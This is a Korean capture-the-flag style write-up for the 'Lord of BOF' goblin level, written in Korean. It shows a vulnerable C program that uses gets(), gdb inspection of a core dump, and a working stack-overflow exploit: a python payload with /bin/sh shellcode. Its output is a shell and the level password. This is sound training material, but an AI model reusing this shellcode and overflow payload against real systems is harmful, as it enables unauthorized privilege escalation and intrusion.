# [WriteUp]The Lord of BOF - cobolt → goblin

:black_nib:chykor12(sjjo0225@gmail.com)

---

```bash
[cobolt@localhost cobolt]$ cat goblin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```

`gets()`로 입력을 받는 것을 제외하고는 `cobolt`와 다른 점이 없다.

BOF를 발생시켜서 `core` 파일을 디버깅해보자.

```bash
[cobolt@localhost /tmp]$ ./goblin
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[cobolt@localhost /tmp]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./goblin'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/20wx $esp-0x20
0xbffffcb0:	0x08048470	0xbffffcb8	0x41414141	0x41414141
0xbffffcc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcd0:	0x41414141	0x41414141	0x41414141	0x40013800
0xbffffce0:	0x00000001	0x08048350	0x00000000	0x08048371
0xbffffcf0:	0x080483f8	0x00000001	0xbffffd14	0x080482bc
```

`esp`의 바로 앞인 `0xbffffccc`가 리턴 어드레스의 주소이므로, 버퍼의 시작 주소와 리턴 어드레스는 `0x14`만큼 떨어져 있다. 리턴 어드레스는 적당히 `0xbffffd10` 정도로 덮으면 될 것 같다.

payload: dummy(`0x14`byte) + return address(`0xbffffd10`) + NOP sled(`0x1000`byte) + shellcode(`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80`)

파이썬 파이프라인을 이용해서 입력을 주는데, 원인은 모르겠지만 입력 문자열의 크기가 840바이트 이상이면 프로그램이 정상적으로 작동하지 않는 문제가 있었다. 그래서 NOP sled의 길이를 500바이트로 줄여서 시도하였다.

```bash
[cobolt@localhost cobolt]$ (python -c 'print "A"*0x14+"\x10\xfd\xff\xbf"+"\x90"*500+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"';cat)|./goblin
AAAAAAAAAAAAAAAAAAAA�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ

whoami
goblin
my-pass
euid = 503
hackers proof
```
